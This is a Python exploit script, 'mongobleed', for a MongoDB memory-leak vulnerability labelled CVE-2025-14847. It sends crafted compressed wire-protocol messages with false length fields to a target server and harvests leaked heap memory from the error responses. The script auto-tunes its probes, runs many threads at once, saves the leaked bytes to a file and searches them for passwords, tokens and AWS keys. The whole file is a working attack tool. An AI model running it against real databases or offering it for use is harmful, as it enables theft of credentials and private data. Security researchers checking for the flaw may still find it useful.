#!/usr/bin/env python3
"""
mongobleed.py - CVE-2025-14847 MongoDB Memory Leak Exploit

Author: Joe Desimone - x.com/dez_
Contributor: @hkashfi Hamid Kashfi

Exploits zlib decompression bug to leak server memory via BSON field names.
Technique: Craft BSON with inflated doc_len, server reads field names from
leaked memory until null byte.
"""

import argparse
import base64
import codecs
import concurrent.futures
import datetime
import os
import re
import socket
import struct
import time
import warnings
import zlib

from rich.console import Console
from urllib.parse import unquote_to_bytes

FIELD_NAME_RE = re.compile(rb"field name '([^']*)'")
TYPE_RE = re.compile(rb"type (\d+)")
URL_ENC_RE = re.compile(r"%[0-9A-Fa-f]{2}")
UNICODE_ESC_RE = re.compile(r"\\u[0-9A-Fa-f]{4}|\\x[0-9A-Fa-f]{2}|\\[nrt\"\\\\]")
ESCAPE_SEQ_RE = re.compile(r"(\\u[0-9A-Fa-f]{4}|\\x[0-9A-Fa-f]{2}|\\[nrt\"\\\\])")
BASE64_RE = re.compile(r"^[A-Za-z0-9+/]+={0,2}$")
SIZE_RE = re.compile(r"^\s*(\d+)\s*(kb|mb)?\s*$", re.IGNORECASE)

def send_probe(host, port, doc_len, buffer_size, timeout):
    """Send crafted BSON with inflated document length"""
    # Minimal BSON content - we lie about total length
    content = b'\x10a\x00\x01\x00\x00\x00'  # int32 a=1
    bson = struct.pack('<i', doc_len) + content
    
    # Wrap in OP_MSG
    op_msg = struct.pack('<I', 0) + b'\x00' + bson
    compressed = zlib.compress(op_msg)
    
    # OP_COMPRESSED with inflated buffer size (triggers the bug)
    payload = struct.pack('<I', 2013)  # original opcode
    payload += struct.pack('<i', buffer_size)  # claimed uncompressed size
    payload += struct.pack('B', 2)  # zlib
    payload += compressed
    
    header = struct.pack('<IIII', 16 + len(payload), 1, 0, 2012)
    
    try:
        sock = socket.socket()
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(header + payload)
        
        response = b''
        while len(response) < 4 or len(response) < struct.unpack('<I', response[:4])[0]:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        sock.close()
        return response
    except:
        return b''

def send_probe_with_status(host, port, doc_len, buffer_size, timeout):
    """Send probe and return (response, ok) for auto-tuning diagnostics."""
    # Minimal BSON content - we lie about total length
    content = b'\x10a\x00\x01\x00\x00\x00'  # int32 a=1
    bson = struct.pack('<i', doc_len) + content
    
    # Wrap in OP_MSG
    op_msg = struct.pack('<I', 0) + b'\x00' + bson
    compressed = zlib.compress(op_msg)
    
    # OP_COMPRESSED with inflated buffer size (triggers the bug)
    payload = struct.pack('<I', 2013)  # original opcode
    payload += struct.pack('<i', buffer_size)  # claimed uncompressed size
    payload += struct.pack('B', 2)  # zlib
    payload += compressed
    
    header = struct.pack('<IIII', 16 + len(payload), 1, 0, 2012)
    
    try:
        sock = socket.socket()
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(header + payload)
        
        response = b''
        while len(response) < 4 or len(response) < struct.unpack('<I', response[:4])[0]:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        sock.close()
        return response, len(response) > 0
    except:
        return b'', False

def extract_leaks(response):
    """Extract leaked data from error response"""
    if len(response) < 25:
        return []
    
    try:
        msg_len = struct.unpack('<I', response[:4])[0]
        if struct.unpack('<I', response[12:16])[0] == 2012:
            raw = zlib.decompress(response[25:msg_len])
        else:
            raw = response[16:msg_len]
    except:
        return []
    
    leaks = []
    
    # Field names from BSON errors
    for match in FIELD_NAME_RE.finditer(raw):
        data = match.group(1)
        if data and data not in [b'?', b'a', b'$db', b'ping']:
            leaks.append(data)
    
    # Type bytes from unrecognized type errors
    for match in TYPE_RE.finditer(raw):
        leaks.append(bytes([int(match.group(1)) & 0xFF]))
    
    return leaks

def main():
    examples = (
        "Examples:\n"
        "  python3 mongobleed.py --host <target>\n"
        "  python3 mongobleed.py --host <target> --min-offset 20 --max-offset 8192\n"
        "  python3 mongobleed.py --host <target> --loop\n"
        "  python3 mongobleed.py --host <target> --loop --max-empty-passes 3\n"
        "  python3 mongobleed.py --host <target> --loop --timeout 3 --workers 200\n"
        "  python3 mongobleed.py --host <target> --auto\n"
        "  python3 mongobleed.py --host <target> --auto --auto-min 128KB --auto-max 5MB\n"
        "  python3 mongobleed.py --host <target> --auto --auto-samples 12\n"
        "  python3 mongobleed.py --host <target> --auto --auto-mode size\n"
        "  python3 mongobleed.py --host <target> --dump 10MB\n"
        "  python3 mongobleed.py --host <target> --dump 10MB --dump-window 2048\n"
        "  python3 mongobleed.py --host <target> --dump 512KB --preview-bytes 4096 --decode\n"
        "  python3 mongobleed.py --host <target> --min-offset 100 --max-offset 20000\n"
    )
    parser = argparse.ArgumentParser(
        description='CVE-2025-14847 MongoDB Memory Leak',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=examples,
    )
    parser.add_argument('--host', default='localhost', help='Target host')
    parser.add_argument('--port', type=int, default=27017, help='Target port')
    parser.add_argument('--min-offset', type=int, default=20, help='Min doc length')
    parser.add_argument('--max-offset', type=int, default=1048576, help='Max doc length')
    parser.add_argument('--buffer-extra', type=int, default=500, help='Extra bytes for claimed buffer size')
    parser.add_argument('--timeout', type=float, default=2.0, help='Socket timeout in seconds')
    parser.add_argument('--workers', type=int, default=max(4, (os.cpu_count() or 4) * 10), help='Thread count')
    parser.add_argument('--preview-bytes', type=int, default=80, help='Bytes to show in console preview')
    parser.add_argument('--max-empty-passes', type=int, default=1, help='Stop after N passes with no new leaks')
    parser.add_argument('--loop', action='store_true', help='Keep looping until stopped')
    parser.add_argument('--decode', action='store_true', help='Try to decode URL, unicode escapes, and base64')
    parser.add_argument('--dump', help='Target claimed size, e.g. 10MB or 512KB')
    parser.add_argument('--dump-window', type=int, default=0, help='Probe +/- N bytes around dump size (0=auto)')
    parser.add_argument('--auto', action='store_true', help='Auto-tune dump size/window for best yield')
    parser.add_argument('--auto-min', default='64KB', help='Min size for auto sweep (e.g., 64KB)')
    parser.add_argument('--auto-max', default='10MB', help='Max size for auto sweep (e.g., 10MB)')
    parser.add_argument('--auto-samples', type=int, default=8, help='Samples per config in auto sweep')
    parser.add_argument('--auto-timeout-max', type=float, default=300.0,
                        help='Max per-probe timeout in auto mode (seconds)')
    parser.add_argument('--auto-mode', choices=['speed', 'size'], default='speed',
                        help='Auto-tune objective: speed (bytes/sec) or size (max bytes)')
    parser.add_argument('--output', default=None, help='Output file (default: auto-generated)')
    args = parser.parse_args()

    console = Console()

    def ascii_preview(data, limit):
        view = data[:limit]
        out = []
        for b in view:
            if 32 <= b <= 126 and b not in (92,):
                out.append(chr(b))
            elif b == 92:
                out.append(r"\\")
            elif b == 9:
                out.append(r"\t")
            elif b == 10:
                out.append(r"\n")
            elif b == 13:
                out.append(r"\r")
            else:
                out.append(f"\\x{b:02x}")
        return "".join(out)

    def truncate_text(text, limit):
        if len(text) <= limit:
            return text
        return text[:limit] + "…"

    def is_mostly_printable(text):
        if not text:
            return False
        printable = sum(1 for ch in text if ch.isprintable())
        return (printable / len(text)) >= 0.7

    def printable_ratio(text):
        if not text:
            return 0.0
        printable = sum(1 for ch in text if ch.isprintable())
        return printable / len(text)

    def render_clean_text(text):
        out = []
        for ch in text:
            code = ord(ch)
            if ch == "\\":
                out.append(r"\\")
            elif ch == "\n":
                out.append(r"\n")
            elif ch == "\r":
                out.append(r"\r")
            elif ch == "\t":
                out.append(r"\t")
            elif 32 <= code <= 126:
                out.append(ch)
            elif ch.isprintable():
                out.append(ch)
            elif code <= 0xFF:
                out.append(f"\\x{code:02x}")
            else:
                out.append(f"\\u{code:04x}")
        return "".join(out)

    def escape_count(text):
        return len(ESCAPE_SEQ_RE.findall(text))

    def iterative_unicode_unescape(text, rounds=2):
        decoded = text
        for _ in range(rounds):
            try:
                with warnings.catch_warnings():
                    warnings.simplefilter("ignore", DeprecationWarning)
                    next_decoded = codecs.decode(decoded, "unicode_escape")
            except Exception:
                break
            if next_decoded == decoded:
                break
            decoded = next_decoded
        return decoded

    def decode_variants(data, limit):
        variants = []
        ascii_text = data.decode("ascii", errors="ignore")

        if URL_ENC_RE.search(ascii_text):
            try:
                decoded_bytes = unquote_to_bytes(ascii_text)
                decoded_text = decoded_bytes.decode("utf-8", errors="replace")
                if is_mostly_printable(decoded_text):
                    variants.append("url:" + truncate_text(decoded_text, limit))
            except Exception:
                pass

        if UNICODE_ESC_RE.search(ascii_text):
            try:
                decoded_text = iterative_unicode_unescape(ascii_text, rounds=2)
                cleaned = render_clean_text(decoded_text)
                improved = (
                    escape_count(cleaned) < escape_count(ascii_text)
                    or printable_ratio(cleaned) > printable_ratio(ascii_text) + 0.1
                )
                if improved and is_mostly_printable(cleaned):
                    variants.append("esc:" + truncate_text(cleaned, limit))
            except Exception:
                pass

        b64_candidate = ascii_text.strip()
        if len(b64_candidate) >= 12 and len(b64_candidate) % 4 == 0 and BASE64_RE.match(b64_candidate):
            try:
                decoded_bytes = base64.b64decode(b64_candidate, validate=True)
                decoded_text = decoded_bytes.decode("utf-8", errors="replace")
                if is_mostly_printable(decoded_text):
                    variants.append("b64:" + truncate_text(decoded_text, limit))
            except Exception:
                pass

        return variants

    def decode_from_preview(preview, limit):
        decoded = iterative_unicode_unescape(preview, rounds=2)
        cleaned = render_clean_text(decoded)
        if len(cleaned) > limit:
            cleaned = truncate_text(cleaned, limit)
        improved = (
            escape_count(cleaned) < escape_count(preview)
            or printable_ratio(cleaned) > printable_ratio(preview) + 0.1
        )
        if improved:
            return cleaned
        return None

    def parse_size(value):
        if value is None:
            return None
        if isinstance(value, int):
            return value
        match = SIZE_RE.match(str(value))
        if not match:
            raise ValueError(f"Invalid size: {value}")
        amount = int(match.group(1))
        unit = (match.group(2) or "").lower()
        if unit == "kb":
            return amount * 1024
        if unit == "mb":
            return amount * 1024 * 1024
        return amount

    def auto_window_for_size(size):
        return max(1024, min(65536, size // 2048))

    def build_windows(size):
        candidates = [0, auto_window_for_size(size), 1024, 4096, 16384, 65536]
        uniq = sorted({w for w in candidates if w >= 0})
        return [w for w in uniq if w == 0 or w < size]

    def sample_offsets(size, window, samples):
        if window <= 0:
            return [size]
        start = max(0, size - window)
        end = size + window
        if samples <= 1:
            return [size]
        step = max(1, (end - start) // (samples - 1))
        offsets = list(range(start, end + 1, step))
        if size not in offsets:
            offsets.append(size)
        return sorted(set(offsets))

    def run_probe_offsets(offsets, buffer_extra, track_timeouts=False):
        leaks_found = set()
        leak_bytes = 0
        empty_count = 0
        with concurrent.futures.ThreadPoolExecutor(
            max_workers=min(args.workers, len(offsets))
        ) as executor:
            if track_timeouts:
                futures = [
                    executor.submit(
                        send_probe_with_status,
                        args.host,
                        args.port,
                        off,
                        off + buffer_extra,
                        args.timeout,
                    )
                    for off in offsets
                ]
            else:
                futures = [
                    executor.submit(
                        send_probe,
                        args.host,
                        args.port,
                        off,
                        off + buffer_extra,
                        args.timeout,
                    )
                    for off in offsets
                ]
            for future in concurrent.futures.as_completed(futures):
                if track_timeouts:
                    response, ok = future.result()
                    if not ok:
                        empty_count += 1
                    leaks = extract_leaks(response)
                else:
                    leaks = extract_leaks(future.result())
                for data in leaks:
                    if data not in leaks_found:
                        leaks_found.add(data)
                        leak_bytes += len(data)
        return leaks_found, leak_bytes, empty_count

    if args.auto:
        try:
            min_size = parse_size(args.auto_min)
            max_size = parse_size(args.auto_max)
        except ValueError as exc:
            console.print(f"[bold red][!][/bold red] {exc}")
            return
        if min_size <= 0 or max_size <= 0 or max_size < min_size:
            console.print("[bold red][!][/bold red] Invalid auto size range.")
            return

        args.dump = None
        args.dump_window = 0

        args.timeout = min(args.timeout, args.auto_timeout_max)
        console.print("[bold cyan][*][/bold cyan] Auto preflight: validating target...")
        try:
            legacy_offsets = list(range(20, 8192))
            legacy_leaks, legacy_bytes, _ = run_probe_offsets(legacy_offsets, args.buffer_extra)
        except KeyboardInterrupt:
            console.print("[bold yellow][!][/bold yellow] Interrupted during preflight.")
            return

        if legacy_bytes == 0:
            console.print("[bold red][!][/bold red] Preflight found no leaks in legacy scan.")
            console.print("[bold red][!][/bold red] Aborting auto-tune; target may be patched or unstable.")
            return
        console.print(
            f"[bold green][+][/bold green] Preflight leaks: "
            f"{len(legacy_leaks)} fragments, {legacy_bytes} bytes"
        )

        sizes = []
        size = min_size
        while size <= max_size:
            sizes.append(size)
            size *= 2
        if sizes[-1] != max_size:
            sizes.append(max_size)

        best = None
        console.print("[bold cyan][*][/bold cyan] Auto-tuning dump size/window...")
        try:
            for size in sizes:
                for window in build_windows(size):
                    offsets = sample_offsets(size, window, args.auto_samples)
                    for buffer_extra in sorted(set([0, 1024, 10240, 102400, args.buffer_extra])):
                        t0 = time.perf_counter()
                        leaks_found, leak_bytes, empty_count = run_probe_offsets(
                            offsets, buffer_extra, track_timeouts=True
                        )
                        elapsed = max(0.001, time.perf_counter() - t0)
                        score = leak_bytes / elapsed
                        key = score if args.auto_mode == 'speed' else leak_bytes
                        empty_ratio = empty_count / max(1, len(offsets))
                        if empty_ratio > 0.5 and args.timeout < args.auto_timeout_max:
                            new_timeout = min(args.auto_timeout_max, args.timeout * 2)
                            if new_timeout != args.timeout:
                                args.timeout = new_timeout
                                console.print(
                                    f"[bold yellow][!][/bold yellow] "
                                    f"High timeout rate ({empty_ratio:.0%}), increasing timeout to {args.timeout:.1f}s"
                                )
                        if leak_bytes > 0:
                            console.print(
                                f"[bold cyan][*][/bold cyan] size={size} window={window} "
                                f"extra={buffer_extra} leaks={len(leaks_found)} "
                                f"bytes={leak_bytes} score={score:.1f}"
                            )
                        if best is None or key > best["key"]:
                            best = {
                                "size": size,
                                "window": window,
                                "buffer_extra": buffer_extra,
                                "score": score,
                                "key": key,
                                "leak_bytes": leak_bytes,
                                "leaks": len(leaks_found),
                            }
        except KeyboardInterrupt:
            console.print("[bold yellow][!][/bold yellow] Interrupted during auto-tune.")
            return

        if best is None or best["leak_bytes"] == 0:
            console.print("[bold red][!][/bold red] Auto-tune found no leaks.")
            return

        target = best["size"]
        window = best["window"]
        args.min_offset = max(0, target - window)
        args.max_offset = target + window + 1
        args.buffer_extra = best["buffer_extra"]
        console.print(
            "[bold green][+][/bold green] Auto-tune selected "
            f"size={target} window={window} extra={args.buffer_extra} "
            f"leaks={best['leaks']} bytes={best['leak_bytes']} "
            f"mode={args.auto_mode}"
        )
        console.print(
            f"[bold cyan][*][/bold cyan] Auto-tune timeout: {args.timeout:.1f}s "
            f"(max {args.auto_timeout_max:.1f}s)"
        )
        console.print(
            "[bold cyan][*][/bold cyan] "
            "Equivalent command: "
            f"python3 mongobleed.py --host {args.host} --port {args.port} "
            f"--min-offset {args.min_offset} --max-offset {args.max_offset} "
            f"--buffer-extra {args.buffer_extra} --timeout {args.timeout:.1f}"
        )

    if args.dump and not args.auto:
        target = parse_size(args.dump)
        if args.dump_window == 0:
            window = max(1024, min(65536, target // 2048))
        else:
            window = max(0, args.dump_window)
        args.min_offset = max(0, target - window)
        args.max_offset = target + window + 1
        args.buffer_extra = 0
        if window:
            console.print(f"[bold cyan][*][/bold cyan] Dump mode: {target} bytes (window +/- {window})")
        else:
            console.print(f"[bold cyan][*][/bold cyan] Dump mode: {target} bytes")

    if not args.output:
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_host = re.sub(r"[^A-Za-z0-9._-]+", "_", args.host)
        args.output = f"leaked_{safe_host}_{args.port}_{ts}.bin"

    console.print("[bold cyan][*][/bold cyan] mongobleed - CVE-2025-14847 MongoDB Memory Leak")
    console.print("[bold cyan][*][/bold cyan] Author: Joe Desimone - x.com/dez_")
    console.print(f"[bold cyan][*][/bold cyan] Target: {args.host}:{args.port}")
    console.print(f"[bold cyan][*][/bold cyan] Scanning offsets {args.min_offset}-{args.max_offset}")
    console.print(f"[bold cyan][*][/bold cyan] Workers: {args.workers}")
    console.print(f"[bold cyan][*][/bold cyan] Output: {args.output}")
    console.print("")
    
    unique_fragments = []
    unique_leaks = set()
    if os.path.exists(args.output):
        with open(args.output, 'rb') as f:
            all_leaked = f.read()
    else:
        all_leaked = b""
    out_fh = open(args.output, 'ab')
    
    def worker(doc_len):
        response = send_probe(
            args.host,
            args.port,
            doc_len,
            doc_len + args.buffer_extra,
            args.timeout,
        )
        return doc_len, extract_leaks(response)

    empty_passes = 0
    pass_num = 0
    interrupted = False
    try:
        while True:
            pass_num += 1
            new_in_pass = 0
            with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
                futures = [executor.submit(worker, doc_len) for doc_len in range(args.min_offset, args.max_offset)]
                for future in concurrent.futures.as_completed(futures):
                    doc_len, leaks = future.result()
                    for data in leaks:
                        if data not in unique_leaks and data not in all_leaked:
                            unique_leaks.add(data)
                            unique_fragments.append(data)
                            out_fh.write(data)
                            all_leaked += data
                            new_in_pass += 1

                            # Show interesting leaks (> 10 bytes)
                            if len(data) > 10:
                                preview = ascii_preview(data, args.preview_bytes)
                                if args.decode:
                                    variants = decode_variants(data, args.preview_bytes * 2)
                                    if variants:
                                        preview = " | ".join(variants)
                                    else:
                                        cleaned = decode_from_preview(preview, args.preview_bytes * 2)
                                        if cleaned:
                                            preview = cleaned
                                console.print(f"[green][+][/green] offset={doc_len:4d} len={len(data):4d}: {preview}")
            if args.loop:
                console.print(f"[bold cyan][*][/bold cyan] Pass {pass_num} complete, new fragments: {new_in_pass}")
                continue

            if new_in_pass == 0:
                empty_passes += 1
            else:
                empty_passes = 0
            console.print(f"[bold cyan][*][/bold cyan] Pass {pass_num} complete, new fragments: {new_in_pass}")
            if empty_passes >= args.max_empty_passes:
                break
    except KeyboardInterrupt:
        interrupted = True
        console.print(
            "[bold yellow][!][/bold yellow] "
            "Ctrl+C detected, attempting graceful shutdown..."
        )
        console.print("[bold yellow][!][/bold yellow] Interrupted by user, finalizing output...")
    finally:
        out_fh.close()
    console.print("")
    console.print(f"[bold cyan][*][/bold cyan] Total leaked: {len(all_leaked)} bytes")
    console.print(f"[bold cyan][*][/bold cyan] Unique fragments (this run): {len(unique_leaks)}")
    console.print(f"[bold cyan][*][/bold cyan] Saved to: {args.output}")
    if interrupted:
        console.print("[bold yellow][!][/bold yellow] Exited early due to interrupt.")
    
    # Show any secrets found
    secrets = [b'password', b'secret', b'key', b'token', b'admin', b'AKIA']
    for s in secrets:
        if s.lower() in all_leaked.lower():
            console.print(f"[bold red][!][/bold red] Found pattern: {s.decode()}")

if __name__ == '__main__':
    main()
